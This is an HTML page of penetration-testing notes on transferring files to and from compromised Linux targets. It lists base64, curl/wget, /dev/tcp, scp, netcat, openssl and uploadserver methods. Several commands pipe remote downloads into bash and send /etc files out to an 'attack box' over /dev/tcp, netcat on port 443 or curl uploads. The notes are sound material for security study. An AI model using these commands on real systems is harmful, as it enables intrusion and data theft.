<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/linux-exploitation/transfer-methods</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/linux-exploitation/transfer-methods"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>Transfer methods</h1>

<p>Send and receive things from / to Linux systems.</p>

<h2>Base64 encoding / decoding</h2>

<p>As always, if the file size is small, we might just need to transfer our file as a base64 string and decode it there:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Get MD5 hash to ensure file's integrity later on:</span>
<span class="nb">md5sum</span> &lt;filename&gt;

<span class="c"># Encode file into base64 string:</span>
<span class="nb">cat</span> &lt;filename&gt; | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="p">;</span><span class="nb">echo</span>

<span class="c"># Then decode it from our linux target:</span>
<span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'&lt;base64 string&gt;'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> &lt;filename&gt;

<span class="c"># Check if the MD5 hash remained the same throughout the entire procedure:</span>
<span class="nb">md5sum</span> &lt;filename&gt;
</code></pre></div>

<h2>curl and wget</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Download a file with curl:</span>
curl <span class="nt">-o</span> /tmp/&lt;filename&gt; https://&lt;domain or IP&gt;/&lt;filename&gt;

<span class="c"># Or with wget:</span>
wget https://&lt;domain or IP&gt;/&lt;filename&gt; <span class="nt">-O</span> /tmp/&lt;filename&gt;

<span class="c"># Fileless download with curl:</span>
curl https://&lt;domain or IP&gt;/&lt;filename&gt; | bash

<span class="c"># Fileless download with wget:</span>
wget <span class="nt">-qO-</span> https://&lt;domain or IP&gt;/&lt;filename&gt; | bash
</code></pre></div>

<h2>Bash</h2>

<p>if you have Bash &gt;= 2.04 and no other tools are available, not everything is lost:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Connect to the target webserver:</span>
<span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/&lt;attack box IP&gt;/&lt;port&gt;

<span class="c"># Make an HTTP GET request:</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"GET /&lt;filename&gt; HTTP/1.1</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">&gt;</span>&amp;3

<span class="c"># Print the response:</span>
<span class="nb">cat</span> &lt;&amp;3
</code></pre></div>

<h2>SSH</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Enable and start SSH server on your attack box:</span>
<span class="nb">sudo </span>systemctl <span class="nb">enable </span>ssh
<span class="nb">sudo </span>systemctl start ssh

<span class="c"># Check if SSH is listening:</span>
netstat <span class="nt">-lnpt</span>

<span class="c"># Download file(s) from the linux target:</span>
scp &lt;username&gt;@&lt;attack box IP&gt;:/&lt;path&gt;/&lt;filename&gt; <span class="nb">.</span> 
</code></pre></div>

<p>If the target allows outbound connections with SSH, you can also use <code>scp</code> to upload files:</p>

<div class="highlight"><pre class="highlight shell"><code>scp /etc/&lt;filename&gt; &lt;username&gt;@&lt;target IP&gt;:/&lt;path&gt;/
</code></pre></div>

<h2>netcat (nc and ncat)</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Start a listener on the target with nc to receive a file:</span>
nc <span class="nt">-lvnp</span> &lt;port&gt; <span class="o">&gt;</span> &lt;filename&gt;

<span class="c"># Same example with ncat:</span>
ncat <span class="nt">-lvnp</span> &lt;port&gt; <span class="nt">--recv-only</span> <span class="o">&gt;</span> &lt;filename&gt;

<span class="c"># Send file to listener on your attack box with nc:</span>
nc <span class="nt">-q</span> &lt;target IP&gt; &lt;port&gt; &lt; &lt;filename&gt;

<span class="c"># Same example with ncat:</span>
ncat <span class="nt">--send-only</span> &lt;target IP&gt; &lt;port&gt; &lt; &lt;filename&gt;

<span class="c"># Open a listener on your attack box on unsuspected port:</span>
<span class="nb">sudo </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">-q</span> 0 &lt; &lt;filename&gt;

<span class="c"># Then download it from the target:</span>
nc &lt;attack box IP&gt; 443 <span class="o">&gt;</span> &lt;filename&gt;

<span class="c"># Same with ncat, set up listener on attack box:</span>
<span class="nb">sudo </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">--send-only</span> &lt; &lt;filename&gt;

<span class="c"># Download it from the target with ncat:</span>
ncat &lt;attack box IP&gt; 443 <span class="nt">--recv-only</span> <span class="o">&gt;</span> &lt;filename&gt;

<span class="c"># If the target doesn't have nc or ncat, use /dev/tcp to receive the file.</span>
<span class="c"># This can also be used to transfer files to our attack box:</span>
<span class="nb">cat</span> &lt; /dev/tcp/&lt;attack box IP&gt;/443 <span class="o">&gt;</span> &lt;filename&gt;
</code></pre></div>

<h2>File encryption</h2>

<p>For sensitive file transfers, we can use <code>openssl</code> to encrypt / decrypt our files:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Encrypt file with openssl:</span>
openssl enc <span class="nt">-aes256</span> <span class="nt">-iter</span> 100000 <span class="nt">-pbkdf2</span> <span class="nt">-in</span> /etc/&lt;filename&gt; <span class="nt">-out</span> &lt;filename&gt;.enc

<span class="c"># Decrypt file with openssl:</span>
openssl enc <span class="nt">-d</span> <span class="nt">-aes256</span> <span class="nt">-iter</span> 100000 <span class="nt">-pbkdf2</span> <span class="nt">-in</span> &lt;filename&gt;.enc <span class="nt">-out</span> &lt;filename&gt;
</code></pre></div>

<h2>Web upload</h2>

<p>For upload operations (getting a file from our target to our attack box), we can use <code>uploadserver</code> which is a python module:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># If not already done, install uploadserver:</span>
python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nt">--user</span> uploadserver

<span class="c"># Create a self-signed certificate:</span>
openssl req <span class="nt">-x509</span> <span class="nt">-out</span> /tmp/server.pem <span class="nt">-keyout</span> server.pem <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-sha256</span> <span class="nt">-subj</span> <span class="s1">'/CN=server'</span>

<span class="c"># Create a new directory and start the web server:</span>
<span class="nb">mkdir </span>https <span class="o">&amp;&amp;</span> <span class="nb">cd </span>https
python3 <span class="nt">-m</span> uploadserver 443 <span class="nt">--server-certificate</span> /tmp/server.pem

<span class="c"># Then upload files from the linux target.</span>
<span class="c"># The --insecure flag has to be used for a self-signed certificate like ours:</span>
curl <span class="nt">-X</span> POST https://&lt;attack box IP&gt;/upload <span class="nt">-F</span> <span class="s1">'files=@/etc/&lt;filename&gt;'</span> <span class="nt">-F</span> <span class="s1">'files=@/etc/&lt;filename&gt;'</span> <span class="nt">--insecure</span>
</code></pre></div>

<h2>Living Off The Land binaries</h2>

<p>If everything else fails, check for alternatives on <a href="https://gtfobins.github.io/" rel="nofollow">GTFOBins</a>. Use <code>+file download</code> or <code>+file upload</code> keywords to find potential binaries.</p>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

